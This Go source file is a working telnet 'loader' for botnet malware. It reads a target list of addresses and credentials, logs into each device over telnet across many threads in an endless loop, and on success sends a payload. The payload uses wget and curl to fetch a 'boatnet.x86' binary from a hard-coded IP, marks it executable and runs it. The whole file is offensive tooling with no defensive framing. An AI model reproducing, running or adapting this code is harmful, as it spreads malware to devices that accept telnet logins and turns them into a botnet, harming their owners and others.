package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	payload       = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/hiddenbin/boatnet.x86; curl -O http://103.67.244.57/hiddenbin/boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF\n"
	timeout       = 15 * time.Second
	readBackLines = 10
)

var loginPrompts = []string{"login:", "Login:", "username:", "Username:", "user:", "User:"}
var passwordPrompts = []string{"Password:", "password:", "passwd:", "Pass:"}
var shellPrompts = []string{"#", "$", ">", "~", "%", "@"}

var (
	successCounter int
	mu             sync.Mutex
	wg             sync.WaitGroup
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: ./loader <target_file> <threads>")
		return
	}

	targetFile := os.Args[1]
	threadCount, err := strconv.Atoi(os.Args[2])
	if err != nil || threadCount < 1 {
		fmt.Println("Invalid thread count")
		return
	}

	printBanner(targetFile, threadCount)

	for {
		runOnce(targetFile, threadCount)
	}
}

func printBanner(filename string, threads int) {
	targetCount := countLines(filename)
	fmt.Println("======================================")
	fmt.Println("     Simple Telnet Loader (Go)        ")
	fmt.Println("======================================")
	fmt.Printf("File       : %s\n", filename)
	fmt.Printf("Loaded     : %d targets\n", targetCount)
	fmt.Printf("Threads    : %d\n", threads)
	fmt.Printf("Start Time : %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Println("======================================\n")
}

func countLines(filename string) int {
	file, err := os.Open(filename)
	if err != nil {
		return 0
	}
	defer file.Close()

	count := 0
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			count++
		}
	}
	return count
}

func runOnce(filename string, maxThreads int) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Failed to open file:", err)
		return
	}
	defer file.Close()

	sem := make(chan struct{}, maxThreads)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			sem <- struct{}{}
			wg.Add(1)
			go func(line string) {
				defer wg.Done()
				handleTarget(line)
				<-sem
			}(line)
		}
	}
	wg.Wait()
}

func handleTarget(entry string) {
	parts := strings.Split(entry, " ")
	if len(parts) != 2 {
		return
	}

	addr := parts[0]
	auth := strings.Split(parts[1], ":")
	if len(auth) != 2 {
		return
	}
	username := auth[0]
	password := auth[1]

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	reader := bufio.NewReader(conn)

	if !expectAny(conn, reader, loginPrompts) {
		return
	}
	conn.Write([]byte(username + "\n"))

	if !expectAny(conn, reader, passwordPrompts) {
		return
	}
	conn.Write([]byte(password + "\n"))

	if !expectAny(conn, reader, shellPrompts) {
		return
	}

	mu.Lock()
	successCounter++
	fmt.Printf("\n[+] Success: %s | user: %s | pass: %s\n", addr, username, password)
	mu.Unlock()

	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond)

	output := readOutput(conn, reader)
	fmt.Printf("[*] Payload sent: %s\n", addr)
	fmt.Println("--------- Telnet Output ---------")
	fmt.Print(output)
	fmt.Println("--------- End Output ------------")
}

func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
	buffer := ""
	timeoutChan := time.After(timeout)

	for {
		select {
		case <-timeoutChan:
			return false
		default:
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			b, err := r.ReadByte()
			if err != nil {
				continue
			}
			buffer += string(b)
			if len(buffer) > 4096 {
				buffer = buffer[len(buffer)-4096:]
			}
			for _, prompt := range prompts {
				if strings.Contains(buffer, prompt) {
					return true
				}
			}
		}
	}
}

func readOutput(conn net.Conn, r *bufio.Reader) string {
	var lines []string
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	for i := 0; i < readBackLines; i++ {
		line, err := r.ReadString('\n')
		if err != nil {
			break
		}
		lines = append(lines, strings.TrimRight(line, "\r\n"))
	}
	return strings.Join(lines, "\n")
}
